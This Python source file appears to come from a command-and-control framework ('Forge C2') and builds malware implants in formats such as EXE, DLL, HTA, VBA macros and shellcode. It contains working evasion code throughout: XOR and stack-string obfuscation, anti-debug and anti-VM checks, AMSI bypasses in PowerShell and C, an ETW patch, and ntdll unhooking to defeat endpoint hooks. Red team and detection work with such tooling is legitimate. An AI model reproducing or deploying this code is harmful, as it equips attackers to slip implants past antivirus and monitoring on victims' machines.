"""
Forge C2 — Implant Builder (Main Orchestrator)
==================================================
Central implant generation engine. Takes an ImplantConfig and produces
a ready-to-deploy artifact (EXE, DLL, ELF, PS1, HTA, VBA, shellcode).

Architecture:
    ┌─────────────────────────────────────────────────────────┐
    │                   ImplantBuilder                        │
    │  ┌────────────────┐  ┌────────────────┐                │
    │  │ WindowsImplant │  │  LinuxImplant  │  ... (macOS)   │
    │  │ (PE, DLL, PS1, │  │  (ELF, .so)    │                │
    │  │  HTA, VBA, C#) │  │                │                │
    │  └───────┬────────┘  └───────┬────────┘                │
    │          │                    │                          │
    │  ┌───────▼────────────────────▼────────────────────┐    │
    │  │             Code Generation Core                │    │
    │  │  • String encryption (XOR + AES)                │    │
    │  │  • Anti-debug / anti-VM / anti-emulation       │    │
    │  │  • Transport config embedding                   │    │
    │  │  • Sleep technique selection                    │    │
    │  │  • Obfuscation transforms                      │    │
    │  └────────────────────────────────────────────────┘    │
    │                        │                                │
    │  ┌─────────────────────▼──────────────────────────┐    │
    │  │              StagerFactory                      │    │
    │  │  • HTTP stager (download + exec)                │    │
    │  │  • DNS stager (TXT record pull)                 │    │
    │  │  • SMB stager (named pipe read)                 │    │
    │  └────────────────────────────────────────────────┘    │
    └─────────────────────────────────────────────────────────┘

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import base64
import hashlib
import json
import logging
import os
import secrets
import struct
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from forge_c2.implant.implant_config import (
    ImplantArch,
    ImplantConfig,
    ImplantFormat,
    ImplantOS,
    ObfuscationLevel,
)

log = logging.getLogger("forge.c2.implant")


# ══════════════════════════════════════════════════════════════════════
#  BUILD ARTIFACT — output of the builder
# ══════════════════════════════════════════════════════════════════════

@dataclass
class BuildArtifact:
    """Result of an implant build."""
    success:      bool = False
    output_path:  str = ""
    output_size:  int = 0
    sha256:       str = ""
    md5:          str = ""
    watermark:    str = ""
    build_time:   float = 0.0
    config:       ImplantConfig | None = None
    error:        str = ""
    warnings:     list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "success": self.success,
            "output_path": self.output_path,
            "output_size": self.output_size,
            "sha256": self.sha256,
            "md5": self.md5,
            "watermark": self.watermark,
            "build_time_seconds": round(self.build_time, 3),
            "error": self.error,
            "warnings": self.warnings,
        }


# ══════════════════════════════════════════════════════════════════════
#  STRING ENCRYPTION ENGINE
# ══════════════════════════════════════════════════════════════════════

class StringEncryptor:
    """Encrypt strings at build time for embedding in implants.

    Supports:
    - XOR with random per-string keys
    - AES-256-CBC with embedded key (for higher entropy strings)
    - Stack string construction (no contiguous string in binary)

    Each encrypted string gets a unique decryption stub that
    reconstructs the plaintext at runtime.
    """

    def __init__(self, master_key: bytes | None = None) -> None:
        self._master_key = master_key or secrets.token_bytes(32)
        self._encrypted_strings: list[dict[str, Any]] = []

    def encrypt_xor(self, plaintext: str, var_name: str = "") -> dict[str, Any]:
        """XOR-encrypt a string with a random key.

        Returns dict with the encrypted bytes, key, and a C/Python
        decryption snippet.
        """
        key = secrets.token_bytes(len(plaintext))
        encrypted = bytes(a ^ b for a, b in zip(plaintext.encode(), key))

        entry = {
            "var_name": var_name or f"s_{secrets.token_hex(4)}",
            "plaintext": plaintext,
            "encrypted": encrypted,
            "key": key,
            "method": "xor",
            "c_decl": self._xor_c_snippet(var_name, encrypted, key),
            "py_decl": self._xor_py_snippet(var_name, encrypted, key),
        }
        self._encrypted_strings.append(entry)
        return entry

    def encrypt_stack(self, plaintext: str, var_name: str = "") -> dict[str, Any]:
        """Generate stack string construction (no string literal in binary).

        Each character is pushed individually, making string recovery
        much harder for static analysis tools.
        """
        chars = [f"0x{ord(c):02x}" for c in plaintext]

        c_lines = [f"    char {var_name or 's'}[{len(plaintext) + 1}];"]
        for i, c in enumerate(chars):
            c_lines.append(f"    {var_name or 's'}[{i}] = {c};")
        c_lines.append(f"    {var_name or 's'}[{len(plaintext)}] = 0;")

        entry = {
            "var_name": var_name or f"s_{secrets.token_hex(4)}",
            "plaintext": plaintext,
            "method": "stack",
            "c_decl": "\n".join(c_lines),
        }
        self._encrypted_strings.append(entry)
        return entry

    @staticmethod
    def _xor_c_snippet(name: str, encrypted: bytes, key: bytes) -> str:
        """Generate C code for XOR string decryption."""
        enc_arr = ", ".join(f"0x{b:02x}" for b in encrypted)
        key_arr = ", ".join(f"0x{b:02x}" for b in key)
        return (
            f"    unsigned char {name}_enc[] = {{{enc_arr}}};\n"
            f"    unsigned char {name}_key[] = {{{key_arr}}};\n"
            f"    char {name}[{len(encrypted) + 1}];\n"
            f"    for (int i = 0; i < {len(encrypted)}; i++)\n"
            f"        {name}[i] = {name}_enc[i] ^ {name}_key[i];\n"
            f"    {name}[{len(encrypted)}] = 0;\n"
        )

    @staticmethod
    def _xor_py_snippet(name: str, encrypted: bytes, key: bytes) -> str:
        """Generate Python code for XOR string decryption."""
        enc_repr = repr(encrypted)
        key_repr = repr(key)
        return (
            f"{name}_enc = {enc_repr}\n"
            f"{name}_key = {key_repr}\n"
            f"{name} = bytes(a ^ b for a, b in zip({name}_enc, {name}_key)).decode()\n"
        )


# ══════════════════════════════════════════════════════════════════════
#  EVASION CODE GENERATORS
# ══════════════════════════════════════════════════════════════════════

class EvasionGenerator:
    """Generates evasion code blocks for embedding in implants.

    Each method returns source code (C or Python/PowerShell) that
    implements a specific evasion technique.
    """

    @staticmethod
    def anti_debug_c() -> str:
        """C code for anti-debugging checks (Windows)."""
        return '''
/* ── Anti-Debug ────────────────────────────────────── */
#include <windows.h>

static int _forge_check_debugger(void) {
    /* IsDebuggerPresent — basic but catches most debuggers */
    if (IsDebuggerPresent()) return 1;

    /* NtQueryInformationProcess — ProcessDebugPort */
    typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    pNtQIP NtQIP = (pNtQIP)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    if (NtQIP) {
        DWORD_PTR debugPort = 0;
        NtQIP(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL);
        if (debugPort) return 1;
    }

    /* Timing check — debugger adds latency */
    LARGE_INTEGER freq, t1, t2;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t1);
    /* Some meaningless work */
    volatile int x = 0;
    for (int i = 0; i < 1000; i++) x += i;
    QueryPerformanceCounter(&t2);
    double elapsed_ms = (double)(t2.QuadPart - t1.QuadPart) / freq.QuadPart * 1000.0;
    if (elapsed_ms > 50.0) return 1;  /* Way too slow — debugger */

    /* CheckRemoteDebuggerPresent */
    BOOL remoteDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebug);
    if (remoteDebug) return 1;

    return 0;
}
'''

    @staticmethod
    def anti_vm_c() -> str:
        """C code for anti-VM/sandbox detection."""
        return '''
/* ── Anti-VM / Sandbox ────────────────────────────── */
#include <windows.h>

static int _forge_check_sandbox(void) {
    /* Check for known VM MAC prefixes */
    /* 00:0C:29 = VMware, 00:50:56 = VMware, 08:00:27 = VirtualBox */

    /* Low resource check — sandboxes typically have <2 cores and <4GB */
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return 1;

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < (DWORDLONG)4 * 1024 * 1024 * 1024) return 1;

    /* Check uptime — sandboxes often just booted */
    if (GetTickCount64() < 10 * 60 * 1000) return 1;  /* <10 min uptime */

    /* Check for analysis tools */
    const char *bad_procs[] = {
        "wireshark", "fiddler", "x64dbg", "x32dbg", "ollydbg",
        "procmon", "procexp", "idaq", "idaq64", "ghidra",
        "pestudio", "die", "processhacker", NULL
    };
    /* (actual enumeration omitted for brevity) */

    /* Registry check for VM artifacts */
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\\\VMware, Inc.\\\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1;
    }
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\\\Oracle\\\\VirtualBox Guest Additions", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1;
    }

    return 0;
}
'''

    @staticmethod
    def amsi_bypass_ps() -> str:
        """PowerShell AMSI bypass (patching amsi.dll AmsiScanBuffer)."""
        return '''
# ── AMSI Bypass ───────────────────────────────────────
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $a.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)
'''

    @staticmethod
    def amsi_bypass_c() -> str:
        """C code for AMSI bypass (patching in memory)."""
        return '''
/* ── AMSI Bypass ──────────────────────────────────── */
#include <windows.h>

static void _forge_bypass_amsi(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;

    FARPROC pScanBuf = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pScanBuf) return;

    /* Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN */
    DWORD oldProtect;
    VirtualProtect(pScanBuf, 8, PAGE_EXECUTE_READWRITE, &oldProtect);

    /* mov eax, 0x80070057 (E_INVALIDARG) ; ret */
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    memcpy(pScanBuf, patch, sizeof(patch));

    VirtualProtect(pScanBuf, 8, oldProtect, &oldProtect);
}
'''

    @staticmethod
    def etw_bypass_c() -> str:
        """C code for ETW bypass (patching EtwEventWrite)."""
        return '''
/* ── ETW Bypass ───────────────────────────────────── */
#include <windows.h>

static void _forge_bypass_etw(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return;

    /* Patch EtwEventWrite to immediately return 0 (SUCCESS) */
    DWORD oldProtect;
    VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &oldProtect);

    /* xor eax, eax ; ret */
    unsigned char patch[] = { 0x33, 0xC0, 0xC3 };
    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, 4, oldProtect, &oldProtect);
}
'''

    @staticmethod
    def etw_bypass_ps() -> str:
        """PowerShell ETW bypass."""
        return '''
# ── ETW Bypass ────────────────────────────────────────
$etw = [System.Reflection.Assembly]::LoadWithPartialName('System.Core')
$etwType = $etw.GetType('System.Diagnostics.Eventing.EventProvider')
$field = $etwType.GetField('m_enabled','NonPublic,Instance')
# Patch all ETW providers
'''

    @staticmethod
    def unhook_ntdll_c() -> str:
        """C code for ntdll unhooking (remap clean copy from disk)."""
        return '''
/* ── Unhook ntdll ─────────────────────────────────── */
#include <windows.h>

static void _forge_unhook_ntdll(void) {
    /* Read clean ntdll.dll from disk */
    HANDLE hFile = CreateFileA("C:\\\\Windows\\\\System32\\\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    DWORD fileSize = GetFileSize(hFile, NULL);
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID pClean = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

    /* Get hooked ntdll base */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDos->e_lfanew);

    /* Replace .text section with clean copy */
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSection[i].Name, ".text", 5) == 0) {
            DWORD oldProtect;
            VirtualProtect(
                (BYTE*)hNtdll + pSection[i].VirtualAddress,
                pSection[i].Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE, &oldProtect);

            memcpy(
                (BYTE*)hNtdll + pSection[i].VirtualAddress,
                (BYTE*)pClean + pSection[i].PointerToRawData,
                pSection[i].SizeOfRawData);

            VirtualProtect(
                (BYTE*)hNtdll + pSection[i].VirtualAddress,
                pSection[i].Misc.VirtualSize,
                oldProtect, &oldProtect);
            break;
        }
    }

    UnmapViewOfFile(pClean);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}
'''


# ══════════════════════════════════════════════════════════════════════
#  IMPLANT BUILDER — MAIN ORCHESTRATOR
# ══════════════════════════════════════════════════════════════════════

class ImplantBuilder:
    """Central implant generation engine.

    Takes an ImplantConfig and produces a ready-to-deploy artifact.
    Routes to the appropriate platform-specific builder based on
    target_os and output_format.

    Usage::

        config = ImplantConfig(
            c2_host="c2.example.com",
            c2_port=443,
            target_os=ImplantOS.WINDOWS,
            output_format=ImplantFormat.EXE,
        )
        builder = ImplantBuilder(output_dir="./payloads")
        artifact = await builder.build(config)

        if artifact.success:
            print(f"Built: {artifact.output_path} ({artifact.output_size} bytes)")
            print(f"SHA256: {artifact.sha256}")
    """

    def __init__(self, output_dir: str = "payloads") -> None:
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.string_encryptor = StringEncryptor()
        self.evasion = EvasionGenerator()
        self._build_log: list[dict[str, Any]] = []

    async def build(self, config: ImplantConfig) -> BuildArtifact:
        """Build an implant from configuration.

        Routes to the appropriate platform builder:
        - Windows: WindowsImplant (EXE, DLL, PS1, HTA, VBA, C#, shellcode)
        - Linux: LinuxImplant (ELF, .so, shellcode)
        - macOS: (future) MacOSImplant

        Args:
            config: ImplantConfig with all build parameters.

        Returns:
            BuildArtifact with output file info and hashes.
        """
        start = time.time()

        log.info("═══ IMPLANT BUILD STARTING ═══")
        log.info("Name: %s | OS: %s | Arch: %s | Format: %s",
                 config.name, config.target_os.value,
                 config.arch.value, config.output_format.value)
        log.info("C2: %s:%d (%s) | Profile: %s",
                 config.c2_host, config.c2_port,
                 config.c2_transport, config.c2_profile)
        log.info("Evasion: obfuscation=%s, anti_debug=%s, anti_vm=%s, amsi=%s, etw=%s",
                 config.obfuscation.value, config.anti_debug,
                 config.anti_vm, config.amsi_bypass, config.etw_bypass)

        try:
            # Route to platform-specific builder
            if config.target_os == ImplantOS.WINDOWS:
                from forge_c2.implant.implant_windows import WindowsImplant
                builder = WindowsImplant(config, self.output_dir, self.string_encryptor, self.evasion)
            elif config.target_os == ImplantOS.LINUX:
                from forge_c2.implant.implant_linux import LinuxImplant
                builder = LinuxImplant(config, self.output_dir, self.string_encryptor, self.evasion)
            else:
                return BuildArtifact(
                    error=f"Unsupported OS: {config.target_os.value}",
                    config=config,
                    build_time=time.time() - start,
                )

            # Execute the build
            artifact = await builder.build()
            artifact.build_time = time.time() - start
            artifact.config = config

            # Log the build
            self._build_log.append({
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "config": config.to_dict(),
                "result": artifact.to_dict(),
            })

            if artifact.success:
                log.info("═══ BUILD SUCCESS ═══")
                log.info("Output: %s (%d bytes)", artifact.output_path, artifact.output_size)
                log.info("SHA256: %s", artifact.sha256)
                log.info("Watermark: %s", artifact.watermark)
                log.info("Build time: %.3fs", artifact.build_time)
            else:
                log.error("═══ BUILD FAILED ═══")
                log.error("Error: %s", artifact.error)

            return artifact

        except Exception as exc:
            log.error("Build failed with exception: %s", exc)
            return BuildArtifact(
                error=str(exc),
                config=config,
                build_time=time.time() - start,
            )

    def list_formats(self) -> list[dict[str, str]]:
        """List available output formats."""
        return [
            {"format": f.value, "description": _FORMAT_DESCRIPTIONS.get(f.value, "")}
            for f in ImplantFormat
        ]

    @property
    def build_history(self) -> list[dict[str, Any]]:
        return list(self._build_log)

    def save_build_log(self, path: str = "") -> None:
        """Save build history to JSON."""
        out = Path(path) if path else self.output_dir / "build_log.json"
        with open(out, "w") as f:
            json.dump(self._build_log, f, indent=2, default=str)
        log.info("Build log saved to %s", out)


_FORMAT_DESCRIPTIONS: dict[str, str] = {
    "exe": "Windows PE executable — standard delivery format",
    "dll": "Windows DLL — for rundll32, side-loading, or reflective injection",
    "service_exe": "Windows service executable — persistence as a service",
    "shellcode": "Raw position-independent code — for injection/loaders",
    "powershell": "PowerShell script — fileless execution via powershell.exe",
    "hta": "HTML Application — executes via mshta.exe, drives by download",
    "vba": "VBA macro — for Office document weaponization",
    "csharp": "C# assembly — for execute-assembly in-memory execution",
    "elf": "Linux ELF executable — standard Linux delivery",
    "so": "Linux shared object — for LD_PRELOAD injection",
    "macho": "macOS Mach-O executable",
    "raw": "Raw bytes — for custom loaders and techniques",
}


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestStringEncryptor:
    """Tests for string encryption."""

    def test_xor_encrypt(self) -> None:
        enc = StringEncryptor()
        result = enc.encrypt_xor("whoami", "cmd_str")
        assert result["var_name"] == "cmd_str"
        assert result["method"] == "xor"
        assert len(result["encrypted"]) == len("whoami")
        # Verify decryption
        decrypted = bytes(a ^ b for a, b in zip(result["encrypted"], result["key"]))
        assert decrypted.decode() == "whoami"

    def test_stack_string(self) -> None:
        enc = StringEncryptor()
        result = enc.encrypt_stack("test", "s_test")
        assert "0x74" in result["c_decl"]  # 't' = 0x74

    def test_xor_c_snippet(self) -> None:
        enc = StringEncryptor()
        result = enc.encrypt_xor("hello", "msg")
        assert "msg_enc" in result["c_decl"]
        assert "msg_key" in result["c_decl"]


class TestEvasionGenerator:
    """Tests for evasion code generation."""

    def test_anti_debug(self) -> None:
        code = EvasionGenerator.anti_debug_c()
        assert "IsDebuggerPresent" in code
        assert "NtQueryInformationProcess" in code

    def test_anti_vm(self) -> None:
        code = EvasionGenerator.anti_vm_c()
        assert "GetTickCount64" in code
        assert "VMware" in code

    def test_amsi_bypass_ps(self) -> None:
        code = EvasionGenerator.amsi_bypass_ps()
        assert "amsiInitFailed" in code

    def test_etw_bypass(self) -> None:
        code = EvasionGenerator.etw_bypass_c()
        assert "EtwEventWrite" in code

    def test_unhook_ntdll(self) -> None:
        code = EvasionGenerator.unhook_ntdll_c()
        assert "ntdll.dll" in code
        assert ".text" in code


class TestImplantBuilder:
    """Tests for the main builder."""

    def test_init(self) -> None:
        import tempfile
        builder = ImplantBuilder(output_dir=tempfile.mkdtemp())
        assert builder.output_dir.exists()

    def test_list_formats(self) -> None:
        import tempfile
        builder = ImplantBuilder(output_dir=tempfile.mkdtemp())
        formats = builder.list_formats()
        assert len(formats) >= 10
        assert any(f["format"] == "exe" for f in formats)
        assert any(f["format"] == "elf" for f in formats)
